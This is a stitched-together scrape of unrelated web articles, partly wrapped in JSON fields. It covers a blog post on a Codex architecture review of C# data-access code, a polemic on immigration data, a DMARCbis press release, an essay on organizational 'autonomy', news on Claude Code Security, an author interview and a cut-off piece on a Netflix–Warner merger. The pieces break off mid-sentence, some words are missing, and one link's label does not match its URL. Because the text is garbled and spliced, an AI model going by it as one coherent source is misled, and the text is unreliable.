Q=Query, C=Command\n    public abstract class DataAccessorBase&lt;Q, C&gt;\n    {\n        //protected D DatabaseContext;\n        protected Q GenericDbQueriesExec;\n        protected C GenericDbCommandExec;\n\n        protected DbAccessPatternWrapper _dbPatternWrapper;\n\n        public DataAccessorBase(Q genericDbQueries, C genericDbCommands)\n        {\n            GenericDbQueriesExec = genericDbQueries;\n            GenericDbCommandExec = genericDbCommands;\n        }\n\n        /// &lt;summary&gt;\n        /// Uses Reflection. \n        /// &lt;/summary&gt;\n        /// &lt;param name=\"dbPatternWrapper\"&gt;&lt;/param&gt;\n        public DataAccessorBase(DbAccessPatternWrapper dbPatternWrapper)\n        {\n            _dbPatternWrapper = dbPatternWrapper;\n            Initialize(_dbPatternWrapper);\n        }\n\n        private void Initialize(DbAccessPatternWrapper dbPatternWrapper)\n        {\n            GenericDbQueriesExec = (Q)Activator.CreateInstance(typeof(Q), dbPatternWrapper.GenericDbRepository);\n            GenericDbCommandExec = (C)Activator.CreateInstance(typeof(C), dbPatternWrapper);\n        }\n\n        public Q Queries()\n        { return (Q)GenericDbQueriesExec; }\n\n        public C Commands()\n        { return (C)GenericDbCommandExec; }\n\n        protected DbAccessPatternWrapper Create_DAWrapper&lt;D&gt;() where D : DbContext_AlexisBase\n        { return _dbPatternWrapper.CreateNewInstance&lt;D&gt;(); }\n    }\n}\n</code></pre><p>I ran the review through VS Code using GPT-5.3 Codex, feeding it a structured instructions file rather than manually prompting. I was explicit about what I wanted: not a syntax review, not a style guide check. I wanted the model to evaluate the architectural decisions, understand the intent behind them, and produce a scored review out of 100, followed by concrete recommendations.</p><p>Output format: Markdown file plus an HTML version of the report.</p><h2><strong>Breaking Down Where It Failed</strong></h2><h3><strong>Problem 1: It flagged reflection as a red flag</strong></h3><p>The library uses reflection to resolve a concrete DbContext at runtime. Codex flagged this. Recommended against it. Treated it as a code smell.</p><p>But reflection here isn't a shortcut or a hack. It's the only reasonable mechanism for doing what the library needs to do. When your DbContext is unknown at compile time and must be supplied by a consuming application, you need a way to discover and instantiate it dynamically. Reflection  the answer. There isn't a cleaner one that doesn't involve pushing significant complexity onto every consumer.</p><p>Codex couldn't make this leap. It saw reflection, matched it against the pattern \"reflection is often misused,\" and flagged it. No consideration of  it was there.</p><h3><strong>Problem 2: DbContext lifecycle criticism missed the point entirely</strong></h3><p>A big chunk of the 46/100 score came from concerns about how DbContext lifecycle is managed. In a typical application, this is a legitimate thing to watch. Mismanaging your context can cause memory leaks, stale data, concurrency issues.</p><p>But the critique assumed a single-application context. In a reusable library, the consuming application owns the DbContext. The library works within that constraint. The lifecycle management looks different because the responsibility is distributed differently by design. Flagging it without understanding that boundary isn't a useful review — it's pattern matching against the wrong pattern.</p><p>This one I found particularly interesting because it's a genuinely clever pattern that solves a real problem.</p><p>Every entity in this library carries two identifiers. The first is a  — a sequential integer, auto-generated by the database. I deliberately avoid calling it  because that name tells you nothing about where it comes from or what it represents.  is explicit: it's the database's identifier, and it only exists after a successful write.</p><p>The second is a GUID, generated by the application the moment the entity is created. No round trip required. The application can assign identity, pass the entity around, queue it, log it — all before the database has ever seen it.</p><p>This hybrid approach gives you the relational database performance benefits of sequential integer keys while also giving you application-level identity without latency. It's a known pattern in distributed systems and event-sourced architectures, though not commonly seen in standard .NET CRUD applications.</p><p>Codex didn't recognise it. It saw the dual-ID design and appeared to treat it as redundancy rather than intentional architecture. No engagement with the performance rationale. No recognition of the distributed systems parallel. Just a flag.</p><h2><strong>The Real Problem: AI Reviews Code, Not Intent</strong></h2><p>Here's the honest summary.</p><p>If I were rating Codex purely as a code reviewer — syntax, structure, common anti-patterns, adherence to established conventions — I'd give it . It's genuinely good at that. It knows the patterns. It catches real issues. It would save a junior developer from several embarrassing PRs.</p><p>But this review wasn't testing that. It was testing whether an AI model can evaluate architectural decisions  — understanding the constraints the design is operating under, the trade-offs that were made deliberately, and the intent that isn't written in the code itself.</p><p>On that measure: </p><p>The gap isn't about knowledge. Codex knows what reflection is. It knows what DbContext is. It's seen CQRS documentation and repository pattern implementations thousands of times. The gap is about reasoning  the code — holding a mental model of why the system is built the way it is, and using that model to interpret what it's looking at.</p><p>Current AI models evaluate against known patterns. Deviations get flagged. But the most interesting architectural decisions are almost always deliberate deviations — trade-offs made with full awareness that the conventional approach won't work at this level of abstraction.</p><p>The difference between \"this looks unusual\" and \"this is unusual because the design is operating at a different level of abstraction\" — that's the gap. And it's a big one.</p><h2><strong>What This Means for AI-Assisted Code Review</strong></h2><p>I'm not writing this to dunk on Codex. It's genuinely impressive at what it does. But I think the developer community is at risk of over-indexing on AI code review without being clear-eyed about what it can and can't evaluate.</p><p>For greenfield application code following established patterns? AI review is fast, useful, and surprisingly accurate. Use it.</p><p>For infrastructure code, reusable libraries, or anything where the architectural decisions are the interesting part? Treat AI feedback as a starting point, not a verdict. The model will flag things that look wrong by convention but are right by design. You need to know the difference.</p><p>The 46/100 score isn't a failure of the library. It's a pretty accurate measurement of where the current ceiling is for AI architectural reasoning.</p><p>We're not there yet. But it's a useful data point to have.</p><p><em>Building something opinionated in .NET? I'd be interested to hear how you've handled the reusability vs. boilerplate trade-off.

I don’t want them in our country,</strong>” Trump told reporters near the end of a lengthy Cabinet meeting. He added: “Their country is no good for a reason. <strong>Your country stinks and we don’t want them in our country.”</strong></em></p></blockquote><p>Counterpoint: this administration stinks and we don’t want them in our country.

That has never been true. Neither have the claims made by Trump and Noem. If there’s anyone capable of reducing the deficit, it’s migrants rather than the most powerful political party in the nation. </p><p>Cato Institute continues to expose the government’s lies about migrants by doing nothing more than simply looking at the data. While Trump continues to pretend immigrants are robbing the country blind and that levying tariffs will make average Americans richer, <a href=\"https://www.cato.org/white-paper/immigrants-recent-effects-government-budgets-1994-2023\" data-type=\"link\" data-id=\"https://www.cato.org/white-paper/immigrants-recent-effects-government-budgets-1994-2023\">Cato is delivering the facts</a>. And the facts say that the best thing this country could do for both the economy and national deficit is bring in as many migrants as possible. </p><ul><li><em>Every year from 1994 to 2023, immigrants have paid more in taxes than they received in benefits.</em></li><li><em>Immigrants generated nearly $10.6 trillion more in federal, state, and local taxes than they induced in total government spending.</em></li><li><em>Accounting for savings on interest payments on the national debt, immigrants saved $14.5 trillion in debt over this 30-year period.</em></li></ul><p>Immigrants have always paid more than their “fair share” in taxes. Tax cheats like Donald Trump are the kind of people who always insist otherwise while preaching to the ignorant faithful. Of the $14.5 trillion in debt reduction created by our nation’s migrant population, more than a third of it ($6.3 trillion) was generated by non-citizens — people who are here illegally or have yet to become naturalized citizens and/or permanent residents. </p><p>The upshot of the data is this: without immigrants, this nation would be so far underwater that it would threaten the future of the nation itself:</p><blockquote><p><em>Without the contributions of immigrants, public debt at all levels would already be above 200 percent of US GDP—nearly twice the 2023 level and a threshold some analysts believe would trigger a debt crisis.</em></p></blockquote><p>Both Kristi Noem and Donald Trump should be made to eat every word of this next paragraph, as painfully and protractedly as possible: </p><blockquote><p><em><strong>Immigrants accounted for more US income and generated more revenue for the government because they were, on average, over 12 percentage points more likely to be employed than the US-born population. This means that even if immigrants earn lower&nbsp;hourly&nbsp;wages, they can still account for more total income per capita than the US-born population by working cumulatively more hours.</strong> This higher employment rate was driven by the fact that immigrants were, on average, 20 percentage points more likely to be of working age. Immigrants usually arrive in the US as young adults and often leave before retirement. </em></p></blockquote><p>Calling immigrants “leeches” and “entitlement junkies” is nothing but naked bigotry. It has to do with the actual facts — facts this government has access to but chooses to ignore in favor of blowing its handful of racist dog whistles repeatedly. </p><p>And yet again, let’s take the latest look at the fact that is perhaps the most uncomfortable for a regime that repeatedly infers that being a migrant means being a criminal worthy of speedy ejection:</p><p>It’s BOGO time at the migrant facts warehouse: by committing fewer crimes migrants are less of drain on public resources than US citizens, who are spending more time behind bars than their “illegal” counterparts. And lest we forget, racists think the reason migrants commit less crime than American citizens is because we have  American citizens. Cato has already dismantled this counterargument, even after factoring in the blatant racism this collection of “but for the Black people” asshats think <a href=\"https://www.techdirt.com/2025/05/07/yet-again-the-data-shows-migrants-are-more-law-abiding-than-us-citizens/\" data-type=\"link\" data-id=\"https://www.techdirt.com/2025/05/07/yet-again-the-data-shows-migrants-are-more-law-abiding-than-us-citizens/\">will allow them to double-down on their bigotry</a>: </p><blockquote><p><em>A persistent criticism of Cato’s paper in this series is that the native-born incarceration rate is only higher because black native-born Americans have a high incarceration rate (see Table 1 from our paper).<strong>&nbsp;It’s certainly true that black native-born Americans have the highest incarceration rates of any ethnic or racial group in any immigrant category. However, the high black American incarceration rate does not overturn our results. It merely narrows them. Immigrants have lower incarceration rates even without considering black native-born rates….</strong></em></p><p><em>Excluding black native-born Americans and black immigrants reduces the native-born incarceration rate by 27 percent, from 1,221 to 891 per 100,000&nbsp;in 2023 (see Table 1 for reference). Excluding black immigrants barely reduces the legal immigrant incarceration rate to 312 per 100,000, but increases the illegal immigrant incarceration rate to 626 per 100,000. Excluding blacks increases the illegal immigrant incarceration rates because their rate is below that of the rest of the population. The legal and illegal immigrant incarceration rate gap with natives also narrows to 65 percent and 30 percent lower, respectively.&nbsp;<strong>Excluding only black native-born Americans and keeping black immigrants in the sample, which doesn’t make sense but critics have brought it up, produces almost identical results.</strong></em></p></blockquote><p>This government can continue to stoke the flames of hatred. But it will never have the facts to back its hateful rhetoric. Of course, that hardly matters to this government and its top officials. But it should matter to everyone else who’s not part of the Executive Branch circle jerk. Migrants are better equipped to make this country great than the people who think merely existing here as the offspring of white people makes them the superior breed. </p>",

      "content": "<p>Wilmington, North America, February 24th, 2026/CyberNewswire/--In a recent DMARCbis fireside chat, email authentication leaders discussed upcoming DMARC changes and how teams can plan for 2026.&nbsp;</p><p><a href=\"https://sendmarc.com/?utm_medium=press-release&amp;utm_source=pr-newswire&amp;utm_campaign=dmarcbis-fireside-chat\">Sendmarc</a> has released a new fireside chat featuring Todd Herr, Principal Solutions Architect at GreenArrow Email and co-editor of DMARCbis, on the upcoming update to DMARC (Domain-based Message Authentication, Reporting, and Conformance).&nbsp;</p><p>Led by Dan Levinson of Sendmarc, the fireside chat explains how the protocol is progressing through the IETF (Internet Engineering Task Force) standards process and what security and email teams can expect as authentication requirements continue to tighten across the ecosystem.&nbsp;</p><p><a href=\"https://sendmarc.com/dmarc/?utm_medium=press-release&amp;utm_source=pr-newswire&amp;utm_campaign=dmarcbis-fireside-chat\">DMARC</a>&nbsp;was originally published in 2015 and has since become a widely adopted control for reducing direct-domain spoofing and improving visibility into legitimate and illegitimate use of an email domain.&nbsp;</p><p>In the discussion, Herr outlines how DMARCbis reflects lessons learned across years of real-world deployment, including clarifications for changes aimed at improving long-term maintainability. DMARCbis (draft-ietf-dmarc-dmarcbis-41) is intended for Proposed Standard status and, if approved, would obsolete RFC 7489.&nbsp;</p><p>“I don’t see DMARCbis as a revolution so much as an evolution,” said Herr.”&nbsp;</p><p>﻿Discussion Themes and Platform Updates</p><p>The video highlights updates and themes relevant to businesses planning email security initiatives:&nbsp;</p><ul><li>Record Tag Updates and Deprecations:&nbsp;Herr discusses tag updates intended to reduce ambiguity and inconsistent implementation, so while DMARC changes, it remains practical to deploy at scale.&nbsp;</li><li>Clearer expectations for reporting and participation:&nbsp;The discussion covers what “full participation” looks like in practice, including the operational work required to maintain aligned authentication and useful reporting.&nbsp;</li><li>Receiver-side policy discovery via DNS tree walk:&nbsp;DMARCbis introduces a standardized DNS tree walk approach that improves how receivers discover the organizational domain.&nbsp;</li><li>Levinson noted that some of the world’s most prominent mailbox providers, such as Microsoft, Google, and Yahoo, have “captured a great number of headlines” by&nbsp;rolling out strict sender requirements that rely heavily on DMARC, SPF, and DKIM –&nbsp;suggesting authentication is necessary to safeguard email, the single most vital communication channel.&nbsp;</li></ul><p>Herr also addresses common misconceptions, including the idea that publishing DMARC alone guarantees inbox placement. The discussion reinforces that authentication helps mailbox providers evaluate identity and apply reputation, but it doesn’t replace strong sending practices.&nbsp;</p><p><a href=\"https://sendmarc.com/?utm_medium=press-release&amp;utm_source=pr-newswire&amp;utm_campaign=dmarcbis-fireside-chat\">Sendmarc</a>&nbsp;helps organizations around the world protect their domains from email impersonation by making DMARC deployment and management practical at scale. With an enterprise-first approach, the platform helps large organizations roll out domain protection at scale, reduce phishing and spoofing risk, and maintain control across complex, multi-domain sender ecosystems.&nbsp;</p><p>Beyond blocking fraud, Sendmarc supports stronger deliverability by helping legitimate communication authenticate correctly and reach inboxes. Enterprises worldwide rely on Sendmarc’s tooling and expertise to move from visibility to enforcement and sustain DMARC compliance over time.&nbsp;</p><p>Customer Success Director, US</p><p>:::tip\nThis story was published as a press release by Cybernewswire under HackerNoon’s Business Blogging&nbsp;</p><p>This article is for informational purposes only and does not constitute investment advice.

Yue said she had previously tested the agent on a smaller \"toy\" inbox where it performed well enough to earn her trust, so she let it loose on the real thing.

      "content": "<p>There is a race underway, and most companies do not yet understand what they are racing toward. The unnamed goal is “autonomy”, the point when organizations self-manage, requiring only human approval to deliver outcomes. That, of course, is an ideal, and not every industry or organization will reach it. But that is the end of the race, because if you can do that, you can win any race. </p><p>We all know something is happening. A few of us are sprinting toward that finish line, and a larger number are beginning to move in that direction. But there are still a lot of companies out there hanging out collecting tools.</p><p>The organizations that reach genuine AI-enabled operations first will not simply grow faster than those that don't. They will become structurally impossible to compete with. When a competitor can coordinate complex operations with a fraction of your human overhead, your human-heavy cost structure becomes indefensible. Margin compression, slower decisions, dependency on human attention at every step: these are existential disadvantages. The race to autonomy is not a metaphor. It is the organizing pressure that will determine which organizations survive the next decade and which become too expensive to exist.</p><p>That reality is beginning to land, unevenly, across the business world. And as it does, something interesting is happening to the way companies buy software.</p><h2>The Four Stages of AI-Buying Consciousness</h2><p>Most organizations are not yet buying software the way they will be buying it in five years. But the progression is visible if you know what to look for.</p><p><strong>The first stage is surface-level awareness</strong>. Buyers here are checking a single box: does this product have AI in it? They cannot fully articulate what they would do with it. They simply know that AI is happening, that their competitors are talking about it, and that buying something without it feels like buying the wrong thing. This is the majority of the market right now. Most software companies have responded by adding AI features, labeling them prominently, and watching conversion improve. For now, it works.</p><p><strong>The second stage is disillusionment</strong>. These buyers have purchased AI-enabled tools, deployed them, and watched them underperform. The AI features exist, but the results don't materialize. The automation breaks on real workflows. The dashboard surfaces data nobody trusts, or even looks at. These buyers are frustrated, but they have not yet diagnosed the real problem. They assume the product is bad, or that AI is overhyped, or that their team didn't adopt it correctly. They don't yet understand that the problem lives below the product.</p><p><strong>The third stage is structural awareness</strong>. This is the emerging edge of the market, and the most important buyer to understand right now. These organizations have begun to realize that their AI failures are not product failures, they are foundation failures. Their data lives in a dozen disconnected systems. Their workflows have never been documented. Nobody knows exactly what work is in progress, who owns it, or what it costs. When you place an AI tool into that environment, it has nothing coherent to reason over. As I have been writing for years: you cannot automate chaos, and these buyers are starting to ask a different question. Not \"which AI product should we buy?\" but \"what do we need to fix before AI can actually work here?\" That is a structural question that demands a structural answer.</p><p><strong>The fourth stage is the confident buyer</strong>. These organizations have done the foundational work. They have consolidated their operational data, documented their workflows, and established the visibility and accountability that AI requires to function reliably. They buy with precision, because they know exactly what problem they are solving and why their environment is ready for it. This buyer is rare today, but they will not be rare in two years. And they are the buyer every software company should be building toward.</p><p>Most software companies are optimizing for stage one buyers. They are adding AI features, improving their marketing language, and competing on the surface of the market. Some of the better ones are learning to address stage two buyers by building better onboarding, adding customer success layers, and reducing time to value. But almost none of them are addressing the real structural problem that stage three buyers are just beginning to articulate.</p><p>Here is the uncomfortable reality: if your buyer's organization is not structurally ready for AI, your product will fail in their hands regardless of how good it is because at some point the AI features will satisfy expectations they aren’t even aware of yet. That buyer will churn, and they will tell others the product didn't work. And they will be right; not because your product failed, but because the foundation it needed to operate on didn't exist.</p><p>The software companies that do not address this will keep cycling through stage one and two buyers, growing through acquisition while losing through churn, never building the kind of customer success that comes from actual transformation. As failures continue to pile up and stage three awareness spreads, buyers will increasingly select away from products that don't come with a credible path to structural readiness. An AI-enabled product without a transformation capability will start to look like a promise nobody believes.</p><h2>Evolution Architecture and the New Practitioner the AI Era Demands</h2><p>This is where I want to introduce what I believe will become the most important human skill set of the AI era: . My Ragsdale Framework for Autonomization points directly to its emergence, describing a five-phase progression to autonomy I call the 5A Model. In doing so, it reveals something unavoidable: <em>organizations cannot traverse that progression alone</em>. Someone has to know how to lead them through it. I have listed those stages below for quick reference:</p><ol><li> — Leadership recognizes the existential imperative to evolve, makes the formal decision to pursue autonomy as a long-term operating objective, and mandates adoption.</li><li> — The organization consolidates work, communication, and activity into a single visible environment, eliminating shadow systems, and connecting the body of the organization to its emerging digital brain for the first time.</li><li> — Visible work becomes structurally defined and traceable, connecting strategy directly to individual execution, producing the training record required for training their synthetic workforce.</li><li> — The artificial workforce is layered into the aligned environment, taking on supervisory and execution tasks, and the organization begins to transform in ways that human coordination alone could never achieve.</li><li> — The organization becomes what the race was always about: a self-managing system where agents handle coordination and execution, and humans govern the boundaries rather than manage and execute the work.</li></ol><p>An organization in the Awareness phase has fundamentally different needs than one in the Alignment phase, and both are completely unready for the tools that only function at Acceleration. You cannot skip phases. You cannot purchase your way past them. Over ninety percent of companies report that their AI tools have not delivered meaningful transformation, and every one of those failures traces back to the same cause: the wrong tool deployed at the wrong phase of maturity. When you understand autonomy as a progression, every one of those failures was entirely predictable.</p><p>What this means practically is that every buying organization sits somewhere on this maturity curve right now, and most of them do not know where. But as stage three consciousness emerges, more and more buyers will begin making purchasing decisions through exactly this lens. They will ask: does this vendor understand where we are on the maturity curve? Does their product address what we actually need right now at this phase? And critically, do they have the capability to move us forward, or are they just selling us something that requires us to already be somewhere we aren't?</p><p>Evolution Architecture is the discipline of understanding that progression, and building the capability to guide organizations through it. At early phases, it is diagnostic and operational: mapping what exists, surfacing what's invisible, creating the foundation that AI needs. At later phases, it becomes more complex: designing parallel execution environments, orchestrating human and artificial actors across multiple domains simultaneously, building the governance layer that keeps intelligent systems aligned with strategic intent. The skills required at each phase build on everything that came before, adding new layers of understanding and capability until the practitioner can operate across the full depth of the stack.</p><h2>The Evolution Partner Will Define the Next Era of Software</h2><p>The software companies that win the next decade will not be the ones with the best AI features. They will be the ones that understand their buyer's maturity stage and build a service capability designed to move that buyer forward.</p><p>This is not a margin trade-off. A service arm is not a concession to lower-quality economics. It is what makes the product work. The software that delivers transformation will deliver it because it was paired with the structural preparation the transformation required. The software that doesn't will become one more expensive experiment in a buyer's growing list of AI initiatives that went nowhere.</p><p>The maturity models that guide this work are beginning to emerge. My Ragsdale Framework for Autonomization is one of them, and others will follow as the discipline matures. What matters is not which model a software company adopts, but whether they adopt any model at all and whether they build the capability to meet their buyers where they are and offer solutions that guide their evolution from that point forward.</p><p>The window to build that capability proactively is open right now. Stage three buyers are still a minority, but the trajectory is clear, and in this race the companies that see the structural shift early and build for it are the ones that will still be standing when it arrives in full. The question every software company needs to answer is not \"how do we add AI to our product?\", but \"how do we become an Evolution Partner?\" The software companies that become Evolution Partners will be ready for the moment when the next generation of buyers fully awakens to what they actually need.</p>",

The announcement triggered investor concerns that advanced AI tools could disrupt traditional cybersecurity products, particularly those focused on code scanning and threat detection.</p><h3>What Is Claude Code Security?</h3><p>Claude Code Security is built to analyze source code, detect potential security flaws, explain risks, and suggest fixes in real time. Unlike conventional tools that rely mainly on predefined rules, the AI system aims to understand code context and uncover complex vulnerabilities before software is deployed.</p><p>\\\nThe tool targets developers, enterprises, and open-source projects, shifting security efforts earlier in the software development lifecycle — a strategy often called “shift-left security.”</p><h3>Why Cybersecurity Stocks Fell</h3><p>Investors reacted to the possibility that AI could automate key functions currently provided by cybersecurity vendors. Companies specializing in endpoint protection, cloud security, and identity management saw notable declines as markets reassessed long-term demand.</p><ul><li><strong>Automation of vulnerability detection and patching</strong></li><li><strong>Reduced need for manual security audits</strong></li><li><strong>Potential consolidation around AI-driven platforms</strong></li><li><strong>Pressure on subscription-based security services</strong></li></ul><p>\\\nCybersecurity exchange-traded funds (ETFs) also moved lower, reflecting broader sector anxiety.</p><h3>AI Could Reshape the Security Industry</h3><p>Claude Code Security focuses on preventing vulnerabilities at the coding stage rather than defending against attacks after deployment. If widely adopted, this approach could reduce the number of exploitable flaws entering production environments.</p><p>\\\nHowever, experts emphasize that software security is only one component of cyber defense. Organizations still require:</p><ul><li>Network monitoring and intrusion detection</li><li>Identity and access management</li><li>Incident response capabilities</li><li>Compliance and risk management</li></ul><p>\\\nAs a result, AI tools are more likely to augment cybersecurity teams rather than replace them entirely.</p><p>Anthropic’s launch underscores a growing trend: artificial intelligence is rapidly becoming embedded in core enterprise infrastructure. Major technology companies are racing to integrate AI into development pipelines, security operations, and cloud platforms.</p><p>\\\nWhile the immediate market reaction reflects uncertainty, many analysts believe AI-enhanced security could ultimately expand the overall market by making advanced protection more accessible.</p><p>\\\nFor now, the sell-off highlights how sensitive technology stocks have become to AI disruption narratives — especially when new tools threaten established revenue models.</p>",

      "content": "<h2>Let’s start! Tell us a bit about yourself. For example, name, profession, and personal interests.</h2><p>Hello, hello everyone. My name is Sergey, and I’m working as Chief Product Officer and Head of Development. I genuinely love software development and the opportunity to create something nice and useful from scratch. I’ve been working in product development for more than 12 years. The majority of this time I’ve worked as a manager. Nevertheless, my original background is systems analysis, and it reflects on every decision or approach in my career.</p><p>Studying and working in software development was never even a question. I absolutely loved computers and tech since my early teens, have a degree in computer science, and started to work full-time as soon as it was possible. After all these years, I’m still completely immersed and have fun in this fast-changing industry and always find new ways to be fascinated.</p><h2>Interesting! What was your latest Hackernoon Top Story about?</h2><p>My latest Top Story was “<a href=\"https://hackernoon.com/inside-the-neural-vocoder-zoo-wavenet-to-diffusion-in-four-audio-clips\">The MoSCoW Method: Key to Agile Product Management</a>,” and it was an extension of the previous one about the <a href=\"https://hackernoon.com/ideaops-why-every-request-is-a-company-asset-in-product-development\">IdeaOps</a> approach in idea validation. There’s always a lot that you want to say, but you have to keep it short and simple. I guess every story has some connection to the previous one and gives an opportunity to share my point of view on development processes.</p><p>I believe that work in software development has to bring joy to anyone involved. And joy converts into revenue growth, market expansion and general winning. But it’s impossible to build something great being stuck in non-working processes and spending the time of highly intelligent and creative people on endless meetings.</p><p>In “The MoSCoW Method” story I provide simple advice that could be implemented promptly and generate value in the observable future. And the main idea is plain - in every team there are a lot of tasks and you have to prioritise them properly to achieve your goals. The method is very basic and simple. It’s easy to dive into and obtain a clear priority system. Later you may improve it with more advanced techniques, but that is a great start. These simple steps streamline the development process and help to automatise work procedures, which will set free the minds of team members and allow us all to have new brilliant products.</p><h2>Do you usually write on similar topics? If not, what do you usually write about?</h2><p>As usual, I’m writing about product development processes. My articles try to help to fix something broken in development routines from different angles and based on real experience and issues that I faced myself throughout my career.</p><ul><li>How to find a perfect Agile cadence?</li><li>It’s necessary to work with tech debt tasks, but there is also a myriad of business tasks. How to find a balance and get both things done?</li><li>How to know what you are managing to adopt as best decisions as you can?</li></ul><p>Answers to all these questions lie in methodologies, written rules and human communication. Sometimes the solution is boring and looks a bit bureaucratic, but I think that is the only way to help creative people to thrive. It may sound controversial, but understandable and clear rules and barriers stimulate the growth of ideas, the search for beelines and help to think about important things.</p><p>There are still hundreds of topics that I would like to cover in the product management area and great thanks to HackerNoon for such a great opportunity to share my thoughts.</p><h2>Great! What is your usual writing routine like (if you have one?)</h2><p>A routine is necessary, because otherwise, there is always something important in your life that you may be diverted into.</p><p>Everything starts with the ideas backlog. During my usual working routine, I may face some obstacle or long-solved issue and add it to my notes as a potential article idea. Going through this backlog, I look for the theme that resonates most right now, and that is how the planning starts. I have my weekly schedule. So, I book evenings and time during weekends for the writing. If you have an appointment somewhere, you have to do this. Booked time for writing helps a lot not to be distracted by something else.</p><p>Also, it’s very important to start with an article decomposition and create a draft note about every section. This helps to retain the original structure idea and the ability to complete short and doable tasks during the week. Small tasks are easy to plan and complete, and aren’t as scary as the whole article in one document. Thanks to the Agile methodologies for the tricks on how to get things done!</p><h2>Being a writer in tech can be a challenge. It’s not often our main role, but an addition to another one. What is the biggest challenge you have when it comes to writing?</h2><p>Sure, it is a challenge. But also a great opportunity to think more deeply about some obstacles or issues that you may have during your working routine. At first, you are solving a problem and later think that it could be interesting to document the solution. But writing the solution gives you some additional ideas that may improve the solution, postponing the article. It’s like an endless cycle of improvement. Tech writing is deeply connected to the main role and helps to boost both.</p><p>The most fascinating thing about software development that has given me joy for all these years is the endless possibilities of making processes or products better. The big challenge is to have boundaries that say “enough”, because otherwise it would be impossible to finish anything. Perfect is the enemy of good.</p><h2>What is the next thing you hope to achieve in your career?</h2><p>Right now I’m managing a wonderful product in B2B Enterprise and feel fulfilled in my career. Also, last year my team and I released a brand-new SaaS product, and I am interested in its development. Still, for almost thirteen years, I have worked in B2B Enterprise product software development. This rich experience helps me to handle any type of issue and provide the best possible products on the market. Nevertheless, some approaches in B2B are quite different from high-load B2C products. As a person interested in software development in general, it would be nice to have an opportunity to find new challenges in high-demand B2C product growth.</p><h2>Wow, that’s admirable. Now, something more casual: What is your guilty pleasure of choice?</h2><p>Ha, I think I love eating something tasty too much. I’m a pretty good cook and sometimes have a strong desire to bake something unhealthy but delicious, or visit a brand-new place in the city that provides some unique cuisine. I guess even our journeys with my beloved wife are built around recommended places with unusual food. I can’t help myself, and this is the way I try to understand other cultures and their traditions. Because nothing shows the core of any society as well as the common and staple food or traditional celebration dishes. Even the snacks could be interesting. I’ve been to many places across the world, but there are still a lot of places that I want to visit and taste.</p><p>Yes, I have, and this is music. Nevertheless, in my case, I wasn't sure that it’s completely non-tech-related.</p><p>Throughout my life, I have been deeply engaged in music, and in my free time, I look for new interesting music, long plays for my vinyl collection, and play my electric guitar. I’m not a professional musician and not even such a good guitar player, but music helps me to calm down and relax.</p><p>During the last few months, AI assistants have helped me to uncover a whole new direction in my hobby and helped to implement the weirdest ideas using software and a computer with my guitar. Like transforming an electric guitar into a bass guitar and playing basslines from the 80s. Before AI, I would not have spent a few hours searching forums for advice on how to produce the bass sound of a particular band on an electric guitar. And now it’s horrifyingly simple; you could get a step-by-step manual on how to enable a few settings and tweaks to produce almost everything. I guess, to get the right sound is sometimes more interesting to me than playing. But this is my hobby; it’s not about the result. A hobby is about something that makes you happy through the process.</p><p>I have a few drafts about Agile and management, but right now I’m into a massive shift in product management caused by AI in the last half a year. Agents have become reliable assistants and I am overwhelmed with the possibilities that modern instruments could provide. Tasks that took weeks can be done in hours. So many things could be simplified and other things become complicated. So, I guess, during the AI transformation in my company and my own journey through tools like “Cursor AI”, I will produce some articles about processes enhanced by AI in the new era of product development.</p><p>I feel endlessly grateful to HackerNoon as a perfect tribune to deliver my thoughts and ideas. The platform has great manuals and is really intuitive. It has everything that may help you to start your writing and publish it after a meticulous review. In 2026, HackerNoon is a well-known brand and I have a lot of acquaintances that know about this platform. It is a big pleasure and honour to have an opportunity to contribute to the global software development community through HackerNoon articles.</p><p>Same here. The questions were fun to answer!</p><p>We are living in the epoch of great changes. Artificial intelligence is everywhere. In social media, thousands of people post about layoffs across the globe. It may seem like the whole industry is not in the best shape. But conversely, I think these times are great for anyone who is engaged and in love with technology. The current industry is an ocean of opportunities. Sometimes I even think that I’m not running fast enough to keep my finger on the pulse. But this has happened before and we should adapt to new changes, and read more meaningful articles on platforms like HackerNoon. As a result, all changes will lead us to a better world.</p><p>Thank you for reading my interview, and I wish everyone great success in their working routine and the opportunity to dream big.</p>",

      "content": "<p>Enter Director James Cameron, who last week decided to “help” by <a href=\"https://gizmodo.com/james-cameron-warner-bros-netflix-paramount-deal-2000724819\">writing a publicized letter to Senator Mike Lee</a>, lamenting the Netflix Warner Brothers merger (and  the Netflix merger) as “disastrous to the motion picture business.” Cameron, who in the letter calls himself a “humble movie farmer,” seems to mostly be concerned with the a possible shortening of the 45-day theater-to-streaming window:</p><blockquote><p><em>He’s also doubtful Netflix would stick to its pledge about keeping movies in theaters for a set amount of time; his letter cited a 17-day theatrical window that was cited in an earlier&nbsp;<a href=\"https://deadline.com/2026/01/box-office-stranger-things-finale-1236660176/\">Deadline</a>&nbsp;report, rather than the more recently mentioned 45-day window.</em></p><p><em>“What administrative body will hold them to task if they slowly sunset their so-called commitment to theatrical releases?” Cameron wondered.</em></p></blockquote><p>Netflix CEO Ted Sarandos <a href=\"https://deadline.com/2026/02/ted-sarandos-james-cameron-netflix-warner-bros-1236731254/\">didn’t take Cameron’s public grievances well</a>, saying he’d already met with Cameron about maintaining the 45-day release window, and lamented Cameron’s participation in a “Paramount disinformation campaign:”</p><blockquote><p><em>“So I am … I’m particularly surprised and disappointed that James chose to be part of the Paramount disinformation campaign that’s been going on for months about this deal,” Sarandos said, sticking it at the same time to the Oscar winner and his&nbsp;<a href=\"https://deadline.com/tag/david-ellison/\">David Ellison</a>-owned WB rival.</em></p></blockquote><p>The weird part about Cameron’s missive is he doesn’t mention Paramount  in his letter to Lee, despite the fact that it’s extremely likely that Paramount would be just as bad on shortening release windows. And given that Paramount and Warner have way more structural similarities than Netflix and Warner, the number of layoffs would likely be . </p><p>This is before you even get to the fact that Larry Ellison is clearly gobbling up media giants in service to our violent kakistocracy, something that seems kind of important to mention if you’re going to inject yourself into the middle of the debate. Cameron mentions none of this; either because he doesn’t know, or because he was potentially made promises by Ellison and Paramount and didn’t want to be transparent about it (neither of which is good). </p><p><strong><em>None of this is to say that a Netflix Warner Brothers merger would be great</em></strong> for consumers or the market. Media consolidation  results in layoffs, higher prices and steadily eroded product quality. Ideally you’d block  additional media consolidation and impose meaningful limits. But that’s <em>s<strong>imply not happening under Trump</strong></em>, making the Netflix Warner tie up the best of a bunch of bad options.</p><p>Anybody trying to do any good (and that includes Dem lawmakers) in the regulatory reality  would likely have to concur Netflix owning Warner is better than Ellison owning the entirety of U.S. media. Especially given what we’ve <a 